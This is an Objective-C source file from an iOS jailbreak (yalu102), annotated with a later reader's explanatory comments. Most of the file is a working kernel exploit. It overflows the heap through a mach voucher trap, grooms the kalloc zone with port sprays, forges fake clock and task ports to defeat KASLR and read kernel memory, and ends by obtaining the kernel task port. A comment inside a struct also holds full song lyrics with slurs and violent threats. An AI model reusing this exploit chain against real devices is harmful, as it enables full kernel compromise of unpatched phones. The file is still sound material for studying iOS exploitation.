//
//  ViewController.m
//  yalu102
//
//  Created by qwertyoruiop on 05/01/2017.
//  Copyright © 2017 kimjongcracks. All rights reserved.
//

#import "offsets.h"
#import "ViewController.h"
#import <mach-o/loader.h>
#import <sys/mman.h>
#import <pthread.h>
#undef __IPHONE_OS_VERSION_MIN_REQUIRED
#import <mach/mach.h>
#include <sys/utsname.h>

extern uint64_t procoff;

// Definition of an OOL mach message
typedef struct {
    mach_msg_header_t head;
    mach_msg_body_t msgh_body;
    mach_msg_ool_ports_descriptor_t desc[256];
    char pad[4096];
} sprz;

@interface ViewController ()

@end

@implementation ViewController

- (void)viewDidLoad {
    [super viewDidLoad];
    // Initialize device specific offsets
    init_offsets();
    struct utsname u = { 0 };
    uname(&u);

    // Check if "RELEASE_ARM" in the uname is replaced to "MarijuanARM". This is modified during the Kernel Exploit. This means that the device is already jailbroken
    if (strstr(u.version, "MarijuanARM")) {
        // Set the "go" view to disabled and change title
        [dope setEnabled:NO];
        [dope setTitle:@"already jailbroken" forState:UIControlStateDisabled];
    }

    // Do any additional setup after loading the view, typically from a nib.
}

typedef natural_t not_natural_t;

// THIS.
// Taken from "/osfmk/ipc/ipc_object.h" and slightly modified
struct not_essers_ipc_object {
    not_natural_t io_bits;          // This would control the characteristic of the port
    not_natural_t io_references;    //
    char    io_lock_data[1337];     // This covers the rest of the structure of ipc_port
    /*

     https://www.youtube.com/watch?v=ZADJ8S1qH3U


     [Intro]
     Lets get it
     Steve Drive
     R.I.P L'A Capone
     OTF
     These nigga's steady woofing like they want beef, want beef?
     You want smoke? You want smoke? Just tell me

     [Hook]
     These niggas steady woofing like they want beef, want beef?[You want smoke?]
     I can make that happen if you want beef, you want beef?[You want smoke?]
     Catch you while you're capping with this semi, semi
     Put the semi-automatic to your kidney, kidney

     [Verse 1]
     Put the semi-automatic to your kidney, kidney
     I'm off the dope I got the pole you talking tough you getting smoked
     These nigga's steady woofing like they want beef, but I really know
     Glock or nickel yeah that bitch go, I'm going like I'm at a fucking show
     I'm off Tu pack saying fuck Jojo[Fuck Jojo]
     Talking shit get your life took no joke
     I'm with my nigga's and my niggas ain't no joke
     And if you got that fucking bag then you getting poked
     And if you acting tough, I'ma fucking blow, and that's on Pluto[On Pluto]
     Me and Durk finna spaz, and I put that on the guys, it's homicides
     Cause we dropping Y's[Die Y, Die Y], head shot got him traumatized
     And you want beef?[You want beef fu nigga?] but when I see you, you don't speak?[You don't even talk]
     I got my 9 on me[Rondo] and I'ma blow and that's on me[I'm Rondo]
     I'm getting tree tree[Getting dope], getting top from a bitch named Kiki

     [Chorus]

     [Verse 2]
     And if you really want smoke[You want smoke little nigga?]
     I will give your ass smoke[Give your ass smoke little nigga?]
     This Glock 9 bitch I tote, and I will put it to your throat
     I'm off this Tooka pack and no L'A, I'ma go crazy
     You supposed to be my nigga but actin' like a fan that’s crazy
     What the fuck wrong with these nigga's, they fugazi
     I made this song for the niggas, cause they crazy
     Separate me from them niggas[Separate Rondo]
     Pull up on your block, with the mops
     Then I hit the dip and put him up in case of attempts[Incase a nigga survive]
     But we don't make throws, we shoot like Pimp[We shoot to kill]
     I got 23[Two three] So i don't fucking speak[I don't speak]
     Riding fast, I hit the dash, ain't gon last[You ain't gonna last nigga], I'ma blast[Cause ima blast on a nigga]
     Numba Nine, bitch [I'm #9 lil nigga], and I'm a sav, bitch

     [Chorus]
     */

};



#define IO_BITS_ACTIVE 0x80000000
#define	IKOT_TASK 2
#define IKOT_IOKIT_CONNECT 29
#define IKOT_CLOCK 25

// Not used anywhere...?
char dt[128];
// "go" executes this
- (IBAction)yolo:(UIButton*)sender
{
    /*

     we out here!

     */

    // The vuln exploiting part, it could crash the kernel here. I think it could be made more reliable using the timing difference thing Luca showed in one of his presentations. Refer here for technical writeup :
    // https://bugs.chromium.org/p/project-zero/issues/detail?id=1004
    // https://googleprojectzero.blogspot.kr/2017/04/exception-oriented-exploitation-on-ios.html
    // I actually understood the exploit a long time ago but had to go through it again because it faded away from my brain... :(

    // Mach voucher port
    mach_port_t vch = 0;

    // "/xnu/tools/tests/darwintests/voucher_traps.c" contains a boiler plate code on how to use mach vouchers
    mach_voucher_attr_recipe_data_t *data = malloc(sizeof(mach_voucher_attr_recipe_data_t) + 0x10);
    data->content_size = 0;
    data->key=MACH_VOUCHER_ATTR_KEY_BANK;       // You can use any key here. BANK sounds cool
    data->command=610;                          // MACH_VOUCHER_ATTR_BANK_CREATE
    data->previous_voucher=MACH_PORT_NULL;

    kern_return_t lol = host_create_mach_voucher(mach_host_self(), data, sizeof(mach_voucher_attr_recipe_data_t), &vch);

    // Testing if host_create_mach_voucher succeeded
    assert(lol==0 && vch!=0);


    // Allocating data for "mach_voucher_extract_attr_recipe_trap" to copy from.
    // The reason why it doesn't respect the "copyin" size restriction(0x4000000) can be seen in the project's settings. It's compiled for armv7, which is 32 bit. So there is absolutely no problem to map on 0x4000000.
    // Assuming the copyin size restriction applies, that means this exploit sadly can't be chained with a Safari exploit on a 64bit device because Safari is obviously not compiled with a shrunken pagezero_size.
    unsigned char* odata = mmap(0, 0x8000, PROT_READ|PROT_WRITE, MAP_PRIVATE|MAP_ANON, -1, 0);
    // The kernel is going to stop copying from this boundary because the this area is marked as "PROT_NONE". The funny thing is, the kernel gracefully returns
    unsigned char* fdata = mmap(odata+0x4000, 0x4000, PROT_NONE, MAP_PRIVATE|MAP_ANON|MAP_FIXED, -1, 0);
    // Did one of the mmaps fail?
    assert(fdata == odata + 0x4000);
    memset(odata, 0x42, 0x0);   // What...?


    uint64_t rsz = 0x100; // alloc size;
    fdata -= rsz + 0x100; // overflow full chunk

    // Creating a fake port object to use for bruteforce/AAR
    struct not_essers_ipc_object* fakeport = mmap(0, 0x8000, PROT_READ|PROT_WRITE, MAP_PRIVATE|MAP_ANON, -1, 0);

    // Prevent this piece of memory to be paged out. I dunno but maybe the kernel faults when it tries to directly manipulate stuff on paged-out userspace memory
    mlock(fakeport, 0x8000);

    // Setting the fake port type(io_bits) to IKOT_CLOCK in order to use it for brute force.
    // Refer to p.38 from "https://www.slideshare.net/i0n1c/cansecwest-2017-portal-to-the-ios-core"
    fakeport->io_bits = IO_BITS_ACTIVE | IKOT_CLOCK;
    // Setting "ipc_object->io_lock_data" to a valid lock value
    fakeport->io_lock_data[12] = 0x11;

    // We're gonna set up exactly one fake port in the target 0x100 zalloc chunk. The rest are 0, hence will return MACH_PORT_NULL
    // The author targets the 0x100 zone because he probably noticed that 0x100 is not such a busy zone, from empirical testing
    *(uint64_t*) (fdata + rsz) = (uint64_t) fakeport;

    // These dummy send/receive ports are going to be used to defragmentize, fill, poke holls in the 0x100 zone
    mach_port_t* ports = calloc(800, sizeof(mach_port_t));

    // Allocate 800 ports to play with
    for (int i = 0; i < 800; i++) {
        mach_port_allocate(mach_task_self(), MACH_PORT_RIGHT_RECEIVE, &ports[i]);               // allocate a port to send to
        mach_port_insert_right(mach_task_self(), ports[i], ports[i], MACH_MSG_TYPE_MAKE_SEND);  // The msgh_local_port field specifies an auxiliary port right, which is conventionally used as a reply port by the recipient of the message. The field must carry a send right, a send-once right, MACH_PORT_NULL, or MACH_PORT_DEAD.
    }

    // This is a dummy "OOL mach message" used to send arrays(256) of MACH_PORT_DEAD port names
    sprz msg1;
    memset(&msg1, 0, sizeof(sprz));

    // Allocate another "OOL mach message" so you don't have to redefine the headers of the previous msg1 everytime you switch between RCV/SND. This is used to receive messages
    sprz msg2;
    memset(&msg2, 0, sizeof(sprz));

    // Strange, I think this should have been 256. The second batch of 128 kalloc(0x100) will not happen as a result...?
    msg1.msgh_body.msgh_descriptor_count = 128;
    // Give it a send right, and make it a complex message to store arrays of OOL ports
    msg1.head.msgh_bits = MACH_MSGH_BITS(MACH_MSG_TYPE_MAKE_SEND, 0) | MACH_MSGH_BITS_COMPLEX;
    // Our own process is gonna receive it so don't need this
    msg1.head.msgh_local_port = MACH_PORT_NULL;
    // I don't remember clearly but I think there was some sort of wierd padding calculation after the port name arrays, and before the mach_msg_trailer. This should account for that
    msg1.head.msgh_size = sizeof(msg1)-2048;

    // To use for the MACH_MSG_OOL_PORTS_DESCRIPTOR mach msg
    mach_port_t* buffer = calloc(0x1000, sizeof(mach_port_t));
    for (int i = 0; i < 0x1000; i++) {
        buffer[i] = MACH_PORT_DEAD;
    }

    // kalloc(0x100) 256 times with a single message; msg1
    for (int i = 0; i < 256; i++) {
        msg1.desc[i].address = buffer;                      // Fill all of them will NULL for now
        msg1.desc[i].count = 0x100/8;                       // kalloc(0x100) for port_names
        msg1.desc[i].type = MACH_MSG_OOL_PORTS_DESCRIPTOR;  // attach OOL ports array to message
        msg1.desc[i].disposition = 19;                      // MACH_MSG_TYPE_COPY_SEND : The message will carry a send right, and the caller should supply a send right. The user reference count for the supplied send right is not changed. The caller may also supply a dead name and the receiving task will get MACH_PORT_DEAD.
    }

    // Notifies the scheduler that the current thread is willing to release its processor to other threads of the same or higher priority.
    pthread_yield_np();
    // Defragmentize the 0x100 zone by spraying (300 * 256 = 76800) times.
    for (int i=1; i<300; i++) {
        msg1.head.msgh_remote_port = ports[i];
        kern_return_t kret = mach_msg(&msg1.head, MACH_SEND_MSG, msg1.head.msgh_size, 0, 0, 0, 0);  // kalloc(0x100) 256 times by send an OOL_PORTS_DESCRIPTOR message to a dummy port
        assert(kret==0);
    }

    // Doing this thing again. Why?
    // You see, we do this so as to lower the chance of any other process or thread running on the system kicking in and allocating kalloc(0x100) during these for loops. This doesn't guarantee a 100%, but it's still a good measure. Better than sleep() I guess.
    pthread_yield_np();
    // Defragmenting(0x100 - 76800 times) some more
    for (int i=500; i<800; i++) {
        msg1.head.msgh_remote_port = ports[i];
        kern_return_t kret = mach_msg(&msg1.head, MACH_SEND_MSG, msg1.head.msgh_size, 0, 0, 0, 0);
        assert(kret==0);
    }

    pthread_yield_np();
    // This allocates in an irregular pattern so as to place a OOL port array right behind the to-be-created holes.
    // It's kinda wierd to use the range 300~500 cause it gives an intuitive feeling that these allocations will be placed in the middle of the 0~300, 500~800 allocations, but in fact these chunks are allocated in the very end and could be just about anywhere in the kernel heap.
    for (int i=300; i<500; i++) {
        msg1.head.msgh_remote_port = ports[i];
        if (i%4 == 0) {
            // Allocate a single 0x100 chunk. This will be freed later by receiving the port
            // This logic will poke approximately 0x13 holes within a Page(0x4000). Hopefully, our target port won't be the last one(1/64 chance)
            // Since pages are allocated randomly in the kernel, if the target port is the last one then the kernel will most likely crash instantly(I think this is the most problematic issue out of all issues. Probably could be mitigated by intial super massive memory fillup becuase after the memory is filled sufficiently, the pages tend to be allocated in a linear(not completely but having a tendancy to) fasion).
            // Also, you can't neglect the slim chance that a hole is allocated right next to a hole, but due to the way the random allocation works(caves inward randomly), the chances are largely neglectible(1/(2^256))
            // Also, there is chance that a bogus object is allocated right behind the hole due to scheduling. This could be improved by carefully placing busy threads, but let's ignore that for now
            msg1.msgh_body.msgh_descriptor_count = 1;
        } else {
            // allocate 0x100 chunks 256 times, 3 times
            msg1.msgh_body.msgh_descriptor_count = 256;
        }
        kern_return_t kret = mach_msg(&msg1.head, MACH_SEND_MSG, msg1.head.msgh_size, 0, 0, 0, 0);
        assert(kret==0);
    }

    pthread_yield_np();
    for (int i = 300; i<500; i+=4) {
        // Receiving the ports in order to create holes
        msg2.head.msgh_local_port = ports[i];       // Uneeded...?
        kern_return_t kret = mach_msg(&msg2.head, MACH_RCV_MSG, 0, sizeof(msg1), ports[i], 0, 0);
        // It's making some holes permanent. Why?
        if(!(i < 380))
            ports[i] = 0;
        assert(kret==0);
    }
    // Ideally, we want to start from the middle of the hole group because the start/end always has some sort of unpredictableness in it.
    // By freeing from 300~500, the freelist will start from the 500 and zalloc will pick up chunks heading towards 300. This loop will fill a few holes, and the result is, the original holes from 300~420 will still be intact.
    // Also, by spraying a certain amount of times, this would stabilized the scheduler so that a wild 0x100 chunk won't be allocated right before the vuln trigger, right on the next line after the loop.
    for (int i = 300; i<380; i+=4) {
        msg1.head.msgh_remote_port = ports[i];
        msg1.msgh_body.msgh_descriptor_count = 1;
        kern_return_t kret = mach_msg(&msg1.head, MACH_SEND_MSG, msg1.head.msgh_size, 0, 0, 0, 0);
        assert(kret==0);
    }

    // Trigger the bug! One of our artificial holes will be filled, and the entire 0x100 chunk after the filled hole will be wiped out, but exactly one fake port will be written in the beginning of the OOL port array
    mach_voucher_extract_attr_recipe_trap(vch, MACH_VOUCHER_ATTR_KEY_BANK, fdata, &rsz);
    mach_port_t foundport = 0;
    for (int i=1; i<500; i++) {
        if (ports[i]) {
            msg1.head.msgh_local_port = ports[i];
            // Not really sure why this is here... maybe the system lags because of receiving too many ports?
            pthread_yield_np();
            // receiving the 256 OOL port arrays
            kern_return_t kret = mach_msg(&msg1, MACH_RCV_MSG, 0, sizeof(msg1), ports[i], 0, 0);
            assert(kret==0);
            // Looping the 256 arrays one by one
            for (int k = 0; k < msg1.msgh_body.msgh_descriptor_count; k++) {
                // All these arrays should be filled with MACH_PORT_DEAD except for just one
                mach_port_t* ptz = msg1.desc[k].address;
                // Loop the array to find a port that's not MACH_PORT_DEAD, that is, the overflown fake port
                for (int z = 0; z < 0x100/8; z++) {
                    // Found it
                    if (ptz[z] != MACH_PORT_DEAD) {
                        if (ptz[z]) {
                            // Our fake port that we're gonna play with
                            foundport = ptz[z];
                            goto foundp;
                        }

                    }
                }
            }
            mach_msg_destroy(&msg1.head);
            mach_port_deallocate(mach_task_self(), ports[i]);
            ports[i] = 0;
        }
    }
    // WTF, overflow failed for some unknown reason
    [sender setTitle:@"failed, retry" forState:UIControlStateNormal];
    return;

foundp:
    // Overflow success
    NSLog(@"found corruption %x", foundport);

    // The base of the iOS kernel _TEXT base, without ASLR
    uint64_t textbase = 0xfffffff007004000;

    // We abuse clock_sleep_trap() using our fake port because it returns KERN_FAILURE if "ipc_port->kobject" doesn't point to &clock_list[SYSTEM_CLOCK] (it's a fixed address in the kernel)
    for (int i = 0; i < 0x300; i++) {
        // It searches only the first 0x40000 every 0x100000 bytes. This is probably statistically correct. Plus it reduces overhead + searching time.
        for (int k = 0; k < 0x40000; k+=8) {
            // Setting "ipc_port->kobject"
            *(uint64_t*)(((uint64_t)fakeport) + 0x68) = textbase + i*0x100000 + 0x500000 + k;
            // Setting bit flags in ipc_port(ip_sprequests, ip_spimportant, etc...) in order to make the kernel believe that this is actually a usable port
            *(uint64_t*)(((uint64_t)fakeport) + 0xa0) = 0xff;

            // Issuing mach trap that uses our fake clock port
            kern_return_t kret = clock_sleep_trap(foundport, 0, 0, 0, 0);

            // Any value other than KERN_FAILURE means that we hit the hardcoded address
            if (kret != KERN_FAILURE) {
                goto gotclock;
            }
        }
    }
    // Should never happen
    [sender setTitle:@"failed, retry" forState:UIControlStateNormal];
    return;

gotclock:;
    // leaked_ptr = &clock_list[SYSTEM_CLOCK] (An address within the kernel)
    uint64_t leaked_ptr =  *(uint64_t*)(((uint64_t)fakeport) + 0x68);

    // Align it to the page boundary
    leaked_ptr &= ~0x3FFF;

    // Now modify our fake port for Arbitrary R/W primitives
    // By using IKOT_TASK,
    fakeport->io_bits = IKOT_TASK|IO_BITS_ACTIVE;
    // Setting io_references to anything but 0
    fakeport->io_references = 0xff;
    // Points to slack space behind the ipc_port object
    char* faketask = ((char*)fakeport) + 0x1000;

    // Setting "ipc_port->kobject" to a fake "struct task"
    // Refer to p.42 from "https://www.slideshare.net/i0n1c/cansecwest-2017-portal-to-the-ios-core" to understand how this stuff works
    *(uint64_t*)(((uint64_t)fakeport) + 0x68) = faketask;
    // Setting bit flags in ipc_port(ip+sprequests, ip_spimportant, etc...)
    *(uint64_t*)(((uint64_t)fakeport) + 0xa0) = 0xff;
    // Setting task->ref_count to anything but 0
    *(uint64_t*) (faketask + 0x10) = 0xee;

    while (1) {
        int32_t leaked = 0;
        // The offset from the start of "struct task" to "task->bsd_info" seems to be fixed to 0x360, but this is prone to change anytime in the future as apple sees fit
        // It'd be nice to use a heuristic method like how K33n Team does it with the cpu_clock thing
        *(uint64_t*) (faketask + procoff) = leaked_ptr - 0x10;

        // This tries to read a value from "task->bsd_info->p_pid" which translates to "faketask->bsd_info->p_pid = (leaked_ptr - 0x10)->p_pid = leaked_ptr"
        pid_for_task(foundport, &leaked);
        // Is it 0xfeedfacf?
        if (leaked == MH_MAGIC_64) {
            NSLog(@"found kernel text at %llx", leaked_ptr);
            break;
        }
        // Retreat one page and search again
        leaked_ptr -= 0x4000;
    }

    // Found kernel base!
    uint64_t kernel_base = leaked_ptr;

    // extern struct proclist allproc;
    // This global variable stores the start of the linked_list of all proc objects
    uint64_t allproc = allproc_offset + kernel_base;

    uint64_t proc_ = allproc;

    uint64_t myproc = 0;
    uint64_t kernproc = 0;

    // Traverse the linked list until the end of the list. I guess the next pointer of the last element is set to 0
    while (proc_) {
        uint64_t proc = 0;

        // Getting the address of the next proc object in the linked list
        *(uint64_t*) (faketask + procoff) = proc_ - 0x10;
        pid_for_task(foundport, (int32_t*)&proc);
        // Need to read 2 times cause "pid_for_task" can only read 4 bytes at a time
        *(uint64_t*) (faketask + procoff) = 4 + proc_ - 0x10;
        pid_for_task(foundport, (int32_t*)(((uint64_t)(&proc)) + 4));

        // Getting the PID of from proc->p_pid
        int pd = 0;
        *(uint64_t*) (faketask + procoff) = proc;
        pid_for_task(foundport, &pd);

        // Checking if it equals my PID
        if (pd == getpid()) {
            // Address of my proc struct
            myproc = proc;
        } else if (pd == 0){
            // Address of the kernel proc struct
            kernproc = proc;
        }
        proc_ = proc;
    }

    // Now we need kernel_task & ipc_space_kernel in order to get full control of the kernel
    // Grabbing the kernel_task(proc->task) object from the kernel proc object
    uint64_t kern_task = 0;
    *(uint64_t*) (faketask + procoff) = kernproc - 0x10 + 0x18;
    pid_for_task(foundport, (int32_t*)&kern_task);
    *(uint64_t*) (faketask + procoff) = 4 + kernproc - 0x10 + 0x18;
    pid_for_task(foundport, (int32_t*)(((uint64_t)(&kern_task)) + 4));

    // Grabbing the port that points to itself which includes a send right (proc->itk_sself)
    uint64_t itk_kern_sself = 0;
    *(uint64_t*) (faketask + procoff) = kern_task - 0x10 + 0xe8;
    pid_for_task(foundport, (int32_t*)&itk_kern_sself);
    *(uint64_t*) (faketask + procoff) = 4 + kern_task - 0x10 + 0xe8;
    pid_for_task(foundport, (int32_t*)(((uint64_t)(&itk_kern_sself)) + 4));

    // These are gonna be copied straight out of the kernel
    char* faketaskport = malloc(0x1000);
    char* ktaskdump = malloc(0x1000);

    // Copy the entire struct(kernel port)
    for (int i = 0; i < 0x1000/4; i++) {
        *(uint64_t*) (faketask + procoff) = itk_kern_sself - 0x10 + i*4;
        pid_for_task(foundport, (int32_t*)(&faketaskport[i*4]));
    }
    // Copy the entire struct(kernel task)
    for (int i = 0; i < 0x1000/4; i++) {
        *(uint64_t*) (faketask + procoff) = kern_task - 0x10 + i*4;
        pid_for_task(foundport, (int32_t*)(&ktaskdump[i*4]));
    }

    // These used to be fake, but they're now all valid real values. The kernel believes them to be real
    memcpy(fakeport, faketaskport, 0x1000);
    memcpy(faketask, ktaskdump, 0x1000);

    mach_port_t pt = 0;

    // Make "proc->kobject" point to our fake task object we copied in userspace
    // Another essential field "proc->receiver" is filled in automagically as we copy the entire kernel ipc_port object into our fake port
    *(uint64_t*)(((uint64_t)fakeport) + 0x68) = faketask;
    *(uint64_t*)(((uint64_t)fakeport) + 0xa0) = 0xff;

    // Stashing the kernel port with a send right into the bootstrap_port
    *(uint64_t*)(((uint64_t)faketask) + 0x2b8) = itk_kern_sself;

    // This retrieves the real kernel port with a send right, that lies in the kernel memory, and returns it for us
    task_get_special_port(foundport, 4, &pt); // TASK_BOOTSTRAP_PORT = 4
    NSLog(@"got tfp0 -> %x", pt);
    // Dispose of the fake port just in case it does some wierd garbage collection shit
    fakeport->io_bits = 0;  // IKOT_NONE

    // Calculating KASLR slide
    extern uint64_t slide;
    slide = kernel_base - 0xFFFFFFF007004000;

    // I want to put this in a header file
    void exploit(void*, mach_port_t, uint64_t, uint64_t);
    // Start post exploitation
    exploit(sender, pt, kernel_base, allproc_offset);

    // If it went this far, then the entire jailbreak process succeeded so mark it and display it on screen
    [dope setEnabled:NO];
    [dope setTitle:@"already jailbroken" forState:UIControlStateDisabled];

}

- (void)didReceiveMemoryWarning {
    [super didReceiveMemoryWarning];
    // Dispose of any resources that can be recreated.
}


@end
